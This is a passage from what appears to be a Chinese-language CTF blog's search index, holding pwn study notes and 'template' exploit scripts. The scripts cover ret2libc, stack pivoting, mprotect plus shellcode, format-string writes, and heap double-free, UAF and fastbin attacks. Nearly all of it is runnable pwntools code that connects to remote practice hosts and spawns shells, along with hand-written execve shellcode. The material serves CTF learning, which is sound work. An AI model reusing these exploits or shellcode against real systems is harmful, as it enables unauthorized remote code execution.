ret=15fmt=b&quot;%40c%14$hhn&quot;p.sendlineafter(&quot;Input:&quot;,fmt)p.interactive()\n\n","categories":["复习"],"tags":["复习","fmt"]},{"title":"pwn从头开始的复习（rop中级篇）","url":"/2023/09/21/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E4%B8%AD%E7%BA%A7%E7%AF%87%EF%BC%89/","content":"libcsearcherret2libc的时候不一定会给libc（大多数情况不给）\n所以需要这个工具去根据泄露出来的libc搜索版本\n给一个例题，本题有多解，我自己写了三解\n例题下载\nfrom pwn import *from LibcSearcher import *p = remote(&#x27;node4.buuoj.cn&#x27;,26558)libc = ELF(&quot;libc-2.27.so&quot;)context.log_level=&quot;debug&quot;elf=ELF(&quot;PicoCTF_2018_rop_chain&quot;)puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]main_addr=elf.sym[&quot;main&quot;]payload=(28)*b&#x27;a&#x27;+p32(puts_plt)+p32(main_addr)+p32(puts_got)p.sendlineafter(&quot;&gt;&quot;,payload)puts_addr = u32(p.recvuntil(&#x27;\\xf7&#x27;)[-4:])libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]system=libc_base+libc.sym[&#x27;system&#x27;]sh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))payload_=28*b&#x27;a&#x27;+p32(system)+p32(main_addr)+p32(sh)p.sendlineafter(&quot;&gt;&quot;,payload_)p.interactive()\n\n\n\nmprotectmprotect这是一个函数，可以修改一段区域的权限，遇到的时候就能考虑使用\nmprotect 函数用于设置一块内存的保护权限（将从 start 开始、长度为 len 的内存的保护属性修改为 prot 指定的值），函数原型如下所示：\n#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot);prot 的取值如下，通过 | 可以将几个属性结合使用（值相加）：- PROT_READ：可写，值为 1- PROT_WRITE：可读， 值为 2- PROT_EXEC：可执行，值为 4- PROT_NONE：不允许访问，值为 0\n\n例题下载\nfrom pwn import *q = remote(&#x27;node4.buuoj.cn&#x27;,28807)#q = process(&#x27;./get_started_3dsctf_2016&#x27;)context.log_level = &#x27;debug&#x27;sleep(0.1)payload = b&#x27;a&#x27;*56payload += p32(0x080489A0) + p32(0x080489A0)payload += p32(0x308CD64F) + p32(0x195719D1)q.sendline(payload)sleep(0.1)q.interactive()from pwn import *q = remote(&#x27;node3.buuoj.cn&#x27;,29645)#q = process(&#x27;./get_started_3dsctf_2016&#x27;)context.log_level = &#x27;debug&#x27;mprotect = 0x0806EC80buf = 0x80ea000pop_3_ret = 0x0804f460read_addr = 0x0806E140payload = &#x27;a&#x27;*56payload += p32(mprotect)payload += p32(pop_3_ret)payload += p32(buf)payload += p32(0x1000)payload += p32(0x7)payload += p32(read_addr)payload += p32(buf)payload += p32(0)payload += p32(buf)payload += p32(0x100)q.sendline(payload)sleep(0.1)shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)q.sendline(shellcode)sleep(0.1)q.interactive()\n\n\n\n栈迁移用来解决溢出量不够的rop\n可以先通过leave|ret控制栈地址，再返回到溢出点，就可以衔接两次溢出\n先去ROPgetdet去找leave|ret\nROPgadget --binary pwn --only &quot;leave|ret&quot;\n\n例题下载\nfrom pwn import *context.log_level=&quot;debug&quot;sys_addr=0x08048400p = remote(&#x27;node4.buuoj.cn&#x27;,25264)payload1 = b&#x27;a&#x27;*0x27+b&#x27;@&#x27;p.send(payload1)p.recvuntil(b&#x27;@&#x27;)ebp = u32(p.recv(4))print (&quot;ebp-----&gt;&quot;,hex(ebp))leave_ret=0x080484b8payload2=b&#x27;aaaa&#x27;+p32(sys_addr)+4*b&#x27;a&#x27;+p32(ebp-0x28)+b&#x27;/bin/sh&#x27;+b&#x27;\\0&#x27;+16*b&#x27;a&#x27;+p32(ebp-0x38)+p32(leave_ret)#                4            8     12             16      23   24       40    44#        38     34            30    2c             28p.send(payload2)p.interactive()\n\n","categories":["复习"],"tags":["复习","rop"]},{"title":"pwn从头开始的复习（rop初级篇）","url":"/2023/09/21/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88rop%E7%AF%87%EF%BC%89/","content":"本篇将以难度顺序讲解各种难度的pwn，因为传参方式不同，这里给两类64位和32位\n我直接给出未解释的地址一般是ida给的或者ROPgadget 给的，去看我的模板去\nret2shell（直接留了后门，最简单的，新手入门用）32位ret2shell32例题下载\nfrom pwn import *p = process(&#x27;./ret2shell32&#x27;)context.log_level=&quot;debug&quot;payload=(0x6C+4)*b&#x27;a&#x27;+p32(0x080485CB)p.sendlineafter(&quot;Please enter your string:&quot;,payload)p.interactive()#你的当前文件夹下没有flag，显示Flag File is Missing.就代表通了\n\n\n\n64位ret2shell64例题下载\nfrom pwn import *# remote()建立远程连接,指明ip和portio = remote(&#x27;node4.buuoj.cn&#x27;,29823)#io=process(&quot;./ret2shell64&quot;)payload = b&#x27;a&#x27;*(0x40 + 0x8) + p64(0x40060D)io.sendline(payload) #发送数据io.interactive() #与shell进行交互#这里好像64和32没什么区别\n\n\n\nret2system（比前面那个难一丢丢，直接给了system函数）例题来自buu ：ciscn_2019_ne_5，也可以到网上看看别人的题解\n32位ret2system32例题下载\n本题比较水，出题人偷偷地留了一个带‘sh’的字符串，可以作为参数传给system直接getshell\nfrom pwn import *context.log_level=&quot;debug&quot;#p = remote(&#x27;node4.buuoj.cn&#x27;,29730)p = process(&quot;./ret2system32&quot;)p.sendlineafter(&quot;password:&quot;,b&#x27;administrator&#x27;)#逆向一下，绕过字符串检测p.sendlineafter(&quot;0.Exit\\n:&quot;,b&#x27;1&#x27;)payload=b&quot;a&quot;*76+p32(0x080484D0)+  4*b&#x27;a&#x27;  +p32(0x080482ea)     #          sys函数plt       填充ebp     sh字符串地址p.sendlineafter(&quot;new log info:&quot;,payload)p.sendlineafter(&quot;0.Exit\\n:&quot;,b&#x27;4&#x27;)p.interactive()#ROPgadget --binary ./ciscn_2019_ne_5 --string &#x27;sh&#x27;#这是一条ROPgadget指令，环境配好以后可以查找文件中的sh字符串位置\n\n64位实在找不到啦，关于64位和32位的区别在下一阶段可以了解，这段算了\nret2libc（真正进入pwn的第一步）这部分主要是借助一些输出函数write，puts，printf泄露出一个函数的真实地址，进而得到libc的真实地址，可以调用libc里的任意函数getshell\n由于每个程序里面的输出函数不一致，需要的参数也不同，所以exp略有区别\n下面是一道32位利用write泄露题的exp\n32位writewrite32下载\nlibc下载：https://buuoj.cn/resources 在里面选择32位libc-2.23.so\nfrom pwn import *#io=remote(&#x27;node4.buuoj.cn&#x27;,28321)io=process(&#x27;./pwn&#x27;)elf=ELF(&#x27;./babyrop&#x27;)libc=ELF(&#x27;./libc-2.23.so&#x27;)system_libc=libc.symbols[&#x27;system&#x27;]binsh_libc=next(libc.search(b&#x27;/bin/sh&#x27;))write_libc=libc.symbols[&#x27;write&#x27;]write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]main_addr=0x8048825payload=b&#x27;\\x00&#x27;+b&#x27;\\xff&#x27;*10io.sendline(payload)io.recvuntil(b&quot;Correct\\n&quot;)payload=b&#x27;a&#x27;*(0xe7+4)+p32(write_plt)+p32(main_addr)#                    ret1           ret2payload+=p32(1)+p32(write_got)+p32(4)#write   par1   par2           par3io.sendline(payload)write_addr=u32(io.recv(4))base=write_addr-write_libcsystem_addr=system_libc+basebinsh_addr=binsh_libc+basepayload=b&#x27;\\x00&#x27;+b&#x27;\\xff&#x27;*10io.sendline(payload)io.recvuntil(b&quot;Correct\\n&quot;)payload=b&#x27;a&#x27;*(0xe7+4)+p32(system_addr)+p32(main_addr)payload+=p32(binsh_addr)io.sendline(payload)io.interactive()# rdi, rsi, rdx, rcx, r8, r9\n\n64位writewrite64下载\nlibc下载：https://buuoj.cn/resources 在里面选择32位libc-2.23.so\nfrom pwn import *from LibcSearcher import *context.log_level=&quot;debug&quot;p = remote(&#x27;node4.buuoj.cn&#x27;,26446)elf=ELF(&quot;level3_x64&quot;)main_addr = elf.sym[&#x27;main&#x27;]write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]pop_rdi_ret=0x00000000004006b3pop_rsi_r15_ret=0x00000000004006b1payload =b&#x27;a&#x27; * (0x80+8) + p64(pop_rdi_ret) +p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0) +p64(write_plt)+ p64(main_addr)p.sendlineafter(&quot;:&quot;,payload)write_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(write_addr))libc = ELF(&quot;libc-2.23.so&quot;)libc_base = write_addr - libc.sym[&#x27;write&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))ret_addr=0x00000000004004c9payload2 =b&#x27;a&#x27; * (0x80+8)  +p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)p.sendlineafter(&quot;:&quot;,payload2)p.interactive()\n\n剩下两种懒得写了，和write只有参数不同，有兴趣自己到网上找找，或者去heshi的github去捞\n","categories":["复习"],"tags":["复习","rop"]},{"title":"heap模板","url":"/2023/09/26/heap%E6%A8%A1%E6%9D%BF/","content":"double freefrom pwn import *context(arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)#p = process(&#x27;./heap_Double_Free&#x27;)p=remote(&#x27;123.60.135.228&#x27;, 2056)def fulltcache():    for i in range(7):        malloc(i, b&#x27;qwer&#x27;)    for i in range(7):        free(i)def malloc(id, contet):    p.sendlineafter(&#x27;root@ubuntu:~/Desktop$&#x27;, b&#x27;1&#x27;)    p.sendlineafter(&#x27;please input id and size :&#x27;, str(id))    sleep(0.1)    p.sendline(b&#x27;100&#x27;)    p.sendlineafter(&#x27;please input contet:&#x27;, contet)def free(id):    p.sendlineafter(&#x27;root@ubuntu:~/Desktop$&#x27;, b&#x27;2&#x27;)    p.sendlineafter(&#x27;please input id :&#x27;, str(id))def print(id):    p.sendlineafter(&#x27;root@ubuntu:~/Desktop$&#x27;, b&#x27;3&#x27;)    p.sendlineafter(&#x27;please input id :&#x27;, str(id))fulltcache()malloc(1, b&#x27;qwer&#x27;)malloc(2, b&#x27;qwer&#x27;)malloc(3, b&#x27;qwer&#x27;)free(1)free(2)free(1)#attach(p)malloc(4,p64(0x006010A0))#可修改的内容在这个地址后16字节malloc(5,b&#x27;qwer&#x27;)malloc(6,b&#x27;qwer&#x27;)malloc(7,p64(257))p.interactive()\n\n简单UAFfrom pwn import *context.log_level=&quot;debug&quot;io=process(&quot;hacknote&quot;)io=remote(&quot;node4.buuoj.cn&quot;,27728)def add(size,content):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(&quot;1&quot;)    io.recvuntil(&quot;size :&quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content :&quot;)    io.sendline(content)def delete(index):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(&quot;2&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))def print_(index):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(&quot;3&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))magic=0x08048945add(30,&quot;HAPPY&quot;)add(30,&quot;HAPPY&quot;)delete(0)delete(1)add(8,p32(magic))#gdb.attach(io)#pause()print_(0)#gdb.attach(io)#pause()io.interactive()\n\nfrom pwn import *p=process(&#x27;./pwn&#x27;)libc=ELF(&#x27;./libc-2.27.so&#x27;)def menu():        p.recvuntil(b&#x27;&gt;&gt; &#x27;)def add(size):        menu()        p.sendline(b&#x27;1&#x27;)        p.recvuntil(b&#x27;book size:\\n&#x27;)        p.sendline(str(size))def edit(idx,con):        menu()        p.sendline(b&#x27;2&#x27;)        p.recvuntil(b&#x27;Book index:\\n&#x27;)        p.sendline(str(idx))        p.recvuntil(b&#x27;Provide book content:&#x27;)        p.sendline(con)def show(idx):        menu()        p.sendline(b&#x27;4&#x27;)        p.recvuntil(b&#x27;index:&#x27;)        p.sendline(str(idx))def free(idx):        menu()        p.sendline(b&#x27;3&#x27;)        p.recvuntil(&#x27;Book index:\\n&#x27;)        p.sendline(str(idx))add(0x500)add(0x80)add(0x500)free(0)show(0)p.recvuntil(b&#x27;OUTPUT:&#x27;)base=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))-4111520one_gadget=base+0x4f2a5print(hex(base))free(1)edit(1,p64(0x602110))add(0x80)add(0x80)edit(4,p64(one_gadget))p.sendline(b&#x27;17&#x27;)p.interactive()\n\nuaffrom pwn import *local = 1binary = &#x27;./UAF_glibc2.23&#x27;libc_path = &#x27;./libc-2.23.so&#x27;port = 0if local == 1:    p = process(binary)def dbg():    context.log_level = &#x27;debug&#x27;def add(index, size, content):    p.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)    p.sendafter(&#x27;index&#x27;, str(index))    p.sendafter(&#x27;size&#x27;, str(size))    p.sendafter(&#x27;content:&#x27;, content)def edit(index, content):    p.sendlineafter(&#x27;&gt;&#x27;, &#x27;2&#x27;)    p.sendafter(&#x27;index&#x27;, str(index))    p.sendafter(&#x27;content:&#x27;, content)def show(index):    p.sendlineafter(&#x27;&gt;&#x27;, &#x27;4&#x27;)    p.sendafter(&#x27;index&#x27;, str(index))def free(index):    p.sendlineafter(&#x27;&gt;&#x27;, &#x27;3&#x27;)    p.sendafter(&#x27;index&#x27;, str(index))message = &quot;======================== LEAK LIBC ADDRESS =======================&quot;success(message)add(2, 0x100, &#x27;2&#x27;)add(3, 0x10, &#x27;protect&#x27;)free(2)add(2, 0x30, &#x27;aaaaaaaa&#x27;)show(2)libc = ELF(libc_path)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 344 - 0x10 - libc.sym[&#x27;__malloc_hook&#x27;]__malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]success(&quot;libc:&#123;&#125;&quot;.format(hex(libc_base)))message = &quot;======================== FASTBIN ATTACK =======================&quot;success(message)add(0, 0x60, &#x27;aaaa&#x27;)free(0)edit(0, p64(__malloc_hook - 0x23))add(1,0x60,&#x27;a&#x27;)og = libc_base + 0xd5bf7add(2,0x60,0x13 * b&#x27;\\x00&#x27; + p64(og))message = &quot;======================== TRIGGER MALLOC HOOK =======================&quot;success(message)p.sendlineafter(&#x27;&gt;&#x27;, &#x27;1&#x27;)p.sendafter(&#x27;index&#x27;, &#x27;1&#x27;)p.sendafter(&#x27;size&#x27;, &#x27;1&#x27;)p.interactive()\n\n2.27uaffrom struct import packcontext.log_level=&#x27;debug&#x27;context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;43.142.108.3&#x27;, 28585)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;buu/libc-2.27-x64.so&#x27;)#libc = ELF(&#x27;glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)libc = ELF(&#x27;libc-2.27.so&#x27;)def debug():\tgdb.attach(p)\tpause()def add(size, name, content):\tp.sendlineafter(b&#x27;Choice: \\n&#x27;, &#x27;1&#x27;)\tp.sendlineafter(b&#x27;Size:\\n&#x27;, str(size))\tp.sendafter(b&#x27;Name: \\n&#x27;, name)\tp.sendafter(b&#x27;Content:\\n&#x27;, content)def free(index):\tp.sendlineafter(b&#x27;Choice: \\n&#x27;, &#x27;2&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(index))def show(index):\tp.sendlineafter(b&#x27;Choice: \\n&#x27;, &#x27;3&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(index))def edit(index, content):\tp.sendlineafter(b&#x27;Choice: \\n&#x27;, &#x27;4&#x27;)\tp.sendlineafter(b&#x27;idx:\\n&#x27;, str(index))\tp.send(content)# leak libcbaseadd(0x410, b&#x27;1&#x27;, b&#x27;a&#x27;) #index 0add(0x20, b&#x27;1&#x27;, b&#x27;a&#x27;) #index 1add(0x10, b&#x27;1&#x27;, b&#x27;a&#x27;) #index 2free(0)show(0)libcbase = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 96 - 0x10 - libc.sym[&#x27;__malloc_hook&#x27;]print(&#x27; libcbase -&gt; &#x27;, hex(libcbase))# malloc_hook -&gt; one_gadgetone_gadget = libcbase + 0x10a2fcmalloc_hook = libcbase + libc.sym[&#x27;__malloc_hook&#x27;]free(1)edit(1, p64(malloc_hook))add(0x10, b&#x27;1&#x27;, b&#x27;a&#x27;) #index 3add(0x20, b&#x27;1&#x27;, b&#x27;a&#x27;) #index 4edit(4, p64(one_gadget))# pwnp.sendlineafter(b&#x27;Choice: \\n&#x27;, &#x27;1&#x27;)p.sendlineafter(b&#x27;Size:\\n&#x27;, b&#x27;10&#x27;)p.interactive()\n\nfrom PwnModules import *#io = process(&#x27;./ez_uaf&#x27;)io = remote(&#x27;node1.anna.nssctf.cn&#x27;, 28894)elf = ELF(&#x27;./ez_uaf&#x27;)libc = ELF(&#x27;/home/kaguya/PwnTool/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)def choice(idx):    io.sendlineafter(b&#x27;Choice: \\n&#x27;, str(idx))def add(size, name, content):    choice(1)    io.sendlineafter(b&#x27;Size:\\n&#x27;, str(size))    io.sendlineafter(b&#x27;Name: \\n&#x27;, name)    io.sendlineafter(b&#x27;Content:\\n&#x27;, content)def free(idx):    choice(2)    io.sendlineafter(b&#x27;Input your idx:\\n&#x27;, str(idx))def show(idx):    choice(3)    io.sendlineafter(b&#x27;Input your idx:\\n&#x27;, str(idx))def edit(idx, content):    choice(4)    io.sendlineafter(b&#x27;Input your idx:\\n&#x27;, str(idx))    io.sendline(content)add(0x410, b&#x27;TST&#x27;, b&#x27;TST&#x27;)add(0x10, b&#x27;TST&#x27;, b&#x27;TST&#x27;)free(0)show(0)addr = leak_addr(2, io) - 0x3ebca0print(hex(addr))one_gadget = addr + 0x10a2fcmalloc_hook = addr + libc.sym[&#x27;__malloc_hook&#x27;]free(1)edit(1, p64(malloc_hook))add(0x10, b&#x27;TST&#x27;, b&#x27;TST&#x27;)add(0x10, b&#x27;TST&#x27;, b&#x27;TST&#x27;)edit(3, p64(one_gadget))choice(1)io.sendlineafter(b&#x27;Size:\\n&#x27;, b&#x27;10&#x27;)io.interactive()\n\n堆溢出from pwn import *def connetc():    global p,elf,libc    p=remote(&#x27;192.168.109.168&#x27;,10000)    #p=process(&#x27;./Emo_Chunk&#x27;)    elf=ELF(&#x27;./Emo_Chunk&#x27;)    libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#context.log_level=&#x27;debug&#x27;def add(size): p.sendlineafter(&quot;Please Choice!&quot;,&#x27;1&#x27;) p.sendlineafter(&quot;Please Input Size:&quot;,str(size))def dele(index): p.sendlineafter(&quot;Please Choice!&quot;,&#x27;2&#x27;) p.sendlineafter(&quot;Please Input index:&quot;,str(index))def show(index): p.sendlineafter(&quot;Please Choice!&quot;,&#x27;4&#x27;) p.sendlineafter(&quot;Please Input index:&quot;,str(index))def edit(index,content): p.sendlineafter(&quot;Please Choice!&quot;,&#x27;3&#x27;) p.sendlineafter(&quot;Please Input index:&quot;,str(index)) p.sendlineafter(&quot;Change EMo Content&quot;,content)def pwn(i,j):    add(0x68)#0    add(0x68)#1    add(0x68)#2    add(0x68)#3    add(0x68)#4    add(0x68)#5      edit(0,&#x27;a&#x27;*0x68 + &#x27;\\xe1&#x27; + &#x27;\\x00&#x27;*7)      dele(1)    add(0x68)    show(2)    p.recvuntil(&#x27;\\n&#x27;)    addr = u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))    print(&quot;addr : &quot; + hex(addr-0x3c4b78))      libc_addr = addr - 0x3c4b78    dele(4)    edit(3,&#x27;a&#x27;*0x68 + p64(0x71) + p64(libc_addr+libc.symbols[&#x27;__malloc_hook&#x27;]-0x23))    print(hex(libc_addr+libc.symbols[&#x27;__malloc_hook&#x27;]-0x23))    realloc_hook = libc_addr + libc.sym[&#x27;__realloc_hook&#x27;]    log.info(&quot;realloc_hook:&quot;+hex(realloc_hook))    realloc = libc_addr + libc.sym[&#x27;realloc&#x27;]    log.info(&quot;realloc:&quot;+hex(realloc))      add(0x68) #4    add(0x68) #6    one = [0x45226,0x4527a,0xf03a4,0xf1247]    edit(6,cyclic(11)+p64(libc_addr+one[i]) + p64(realloc + j))    add(0x30)    p.interactive()for i in range(4): for j in [0,2,4,6,8,10,13,16,20]:     try:      print(&quot;i :&quot;,i)      print(&quot;j :&quot;,j)      connetc()      pwn(i,int(j))          p.close()     except :      print(&quot;...&quot;)      p.close()\n","categories":["笔记","模板"],"tags":["模板"]},{"title":"pwn从头开始的复习（shellcode篇）","url":"/2023/09/21/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88shellcode%E7%AF%87%EF%BC%89/","content":"z\n最简单的shellcode，写什么执行什么直接用shellcode.sh生成，再asm转换为二进制\n例题下载\nfrom pwn import *# remote()建立远程连接,指明ip和portio = remote(&#x27;node4.buuoj.cn&#x27;,28957)context(log_level = &quot;debug&quot;,arch = &quot;i386&quot;,os = &quot;linux&quot;)#io=process(&quot;./level1&quot;)io.recvuntil(&quot;What&#x27;s this:&quot;)buf_addr=io.recvuntil(b&quot;?&quot;)buf_addr= buf_addr[:-1]shellcode = asm(shellcraft.sh())payload = shellcode.ljust(140,b&#x27;a&#x27;)+p32(int(buf_addr, 16))io.sendline(payload) #发送数据io.interactive() #与shell进行交互\n\n存在过滤的shellcode去我的分组对抗1看看，熊写了一道\n机器码对应汇编： https://blog.csdn.net/weixin_43708844/article/details/103211703\n长度不足的shellcode找目前最短的shellcode，有别的想法可以接着开发\ni386长度18\npush   0xbpop    eaxpush   ebxpush   0x68732f2fpush   0x6e69622fmov    ebx,espint    0x80\n\n amd64长度22\nxor \trsi,\trsi\t\t\tpush\trsi\t\t\t\tmov \trdi,\t0x68732f2f6e69622f\t push\trdipush\trsp\t\tpop\trdi\t\t\t\tmov \tal,\t59\t\t\tcdq\t\t\t\t\tsyscall\n\n","categories":["复习"],"tags":["复习","shellcode"]},{"title":"pwn从头开始的复习（工具使用）","url":"/2023/09/21/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%89/","content":"glibc-all-in-one在glibc-all-in-one目录下\n获取可下载的libc列表cat list \n\n./download name\n\n\n\n查看对应连接器\nstrings buu/libc-2.23-x64.so | grep ubuntu\n\n查看目前链接信息ldd -v pwn\n\n换源patchelf --replace-needed libc.so.6  /home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6 heap_Double_Free\n\npatchelf --set-interpreter /home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./heap_Double_Free \n\n\n\nOnegadgetone_gadget filename  #libc文件名\n\n一运行就能拿到shell的地址，但是会标使用条件，找能实现的搞就好\nROPgadget搜索ret指令的地址ROPgadget  –binary filename –only ‘ret’ \n\n控制寄存器用ROPgadget --binary fliename --only &quot;pop|ret&quot;\n\n静态编译文件直接得到完整rop链ROPgadget --binary fliename --ropchain \n\n搜索字符串，给出字符串地址ROPgadget --binary ./fliename --string &#x27;sh&#x27;\n\n下面是一些零散的小python语句context(log_level = &quot;debug&quot;,arch = &quot;i386&quot;,os = &quot;linux&quot;) \\#表明系统 \n\npayload = fmtstr_payload(offset, &#123;atoi_got : sys_plt&#125;) 自动生成fmt_payload\n\nshellcode = asm(shellcraft.sh())#&lt;-这里利用pwntools的asm()函数来写shellcode. \n\npayload = flat([shellcode.ljust(padding,&#x27;A&#x27;),buf_addr])这段代码是将shellcode和buf_addr连接成一个字符串，其中shellcode右侧填充&#x27;A&#x27;字符，直到字符串长度为padding。然后使用flat函数将这个字符串转换为二进制格式，以便在后续的操作中使用。\n\n应付piefor k in range(500):     p.recvuntil(b&#x27;welcome\\n&#x27;)     i=random.randint(0,14)     payload = b&#x27;A&#x27;*104 +canary+p64(0x7fffffffdddddddd) + p8(0x31)+p8(0x02+i*16)     p.send(payload)     \n\n","categories":["复习"],"tags":["复习","工具"]},{"title":"test_download","url":"/2023/07/28/test-download/","content":"东京之行\nheshi爱听的口水歌\nelf小测试台场捡的偶像\n","categories":["测试"],"tags":["网站测试"]},{"title":"rop模板","url":"/2023/09/26/rop%E6%A8%A1%E6%9D%BF/","content":"不用libcsearcher的时候用next(libc.search(b&#x27;/bin/sh&#x27;))用的时候用libc.dump(&#x27;str_bin_sh&#x27;)\n\n\n\n32位printffrom pwn import *from LibcSearcher import *context.log_level=&quot;debug&quot;p = remote(&#x27;node4.buuoj.cn&#x27;,28619)elf=ELF(&quot;pwn2_sctf_2016&quot;)libc=ELF(&quot;libc-2.23.so&quot;)p.sendlineafter(&quot;read?&quot;,b&#x27;-1&#x27;)esi_edi_ebp=0x0804864datoi_got=elf.got[&quot;atoi&quot;]printf_plt=elf.plt[&quot;printf&quot;]format_str=0x080486F8main_addr=elf.sym[&quot;main&quot;]payload=(0x2c+4)*b&#x27;a&#x27;+p32(printf_plt) +p32(main_addr)  +p32(format_str) +p32(atoi_got)p.sendlineafter(&quot;data!&quot;,payload)atoi_addr=u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])print(hex(atoi_addr))libc_base=atoi_addr-libc.sym[&quot;atoi&quot;]system_addr=libc_base+libc.sym[&quot;system&quot;]bin_sh=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))ret=0x08048346p.sendlineafter(&quot;read?&quot;,b&#x27;-1&#x27;)payload_=(0x2c+4)*b&#x27;a&#x27;+p32(ret)+p32(system_addr)+p32(main_addr)+p32(bin_sh)p.sendlineafter(&quot;data!&quot;,payload_)p.interactive()\n\n64位printffrom pwn import *from LibcSearcher import *context.log_level=&quot;debug&quot;p = remote(&#x27;node4.buuoj.cn&#x27;,29207)elf=ELF(&quot;babyrop2&quot;)libc=ELF(&quot;libc.so.6&quot;)rdi=0x0000000000400733rsi_r15_ret=0x0000000000400731printf_plt=elf.plt[&quot;printf&quot;]read_got=elf.got[&quot;read&quot;]format_str=0x0000000000400770main_addr= elf.sym[&quot;main&quot;]payload(0x20+8)*b&#x27;a&#x27;+p64(rdi)+p64(format_str)+p64(rsi_r15_ret)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_addr)p.sendlineafter(&quot;What&#x27;s your name?&quot;,payload)read_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_base=read_addr-libc.sym[&quot;read&quot;]system_addr=libc_base+libc.sym[&quot;system&quot;]bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))payload_=(0x20+8)*b&#x27;a&#x27;+p64(rdi)+p64(bin_sh_addr)+p64(system_addr)p.sendlineafter(&quot;What&#x27;s your name?&quot;,payload_)p.interactive()\n\n32位putsfrom pwn import *from LibcSearcher import *context(arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)elf=ELF(&#x27;Game&#x27;)libc=ELF(&#x27;libc-2.23.so&#x27;)elf=ELF(&#x27;Game&#x27;)#p = process(&#x27;Game&#x27;)star=0x080485F4p= remote(&quot;123.60.135.228&quot;,2136)puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]p.sendlineafter(&quot;Do you play game?&quot;,b&#x27;yes&#x27;)p.sendlineafter(&quot;Do you think playing games will affect your learning?&quot;,b&#x27;yes&#x27;)payload=(0x6c+4)*b&#x27;a&#x27;+p32(puts_plt)+p32(star)+p32(puts_got)p.sendlineafter(&quot;I think the same as you!&quot;,payload)p.recvline()puts_addr= u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])print(hex(puts_addr))libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)ret=0x080483ealibc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload=(0x6c+4)*b&#x27;a&#x27;+p32(ret)+p32(system_addr)+p32(star)+p32(binsh_addr)p.sendlineafter(&quot;I think the same as you!&quot;,payload)p.interactive()\n\n64位putsfrom pwn import *from LibcSearcher import *context.log_level=&quot;debug&quot;p = remote(&#x27;node4.buuoj.cn&#x27;,28552)elf=ELF(&quot;bjdctf_2020_babyrop&quot;)main_addr = elf.sym[&#x27;main&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_rdi_ret=0x0000000000400733payload =b&#x27;a&#x27; * 40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendlineafter(&quot;Pull up your sword and tell me u story!&quot;,payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - 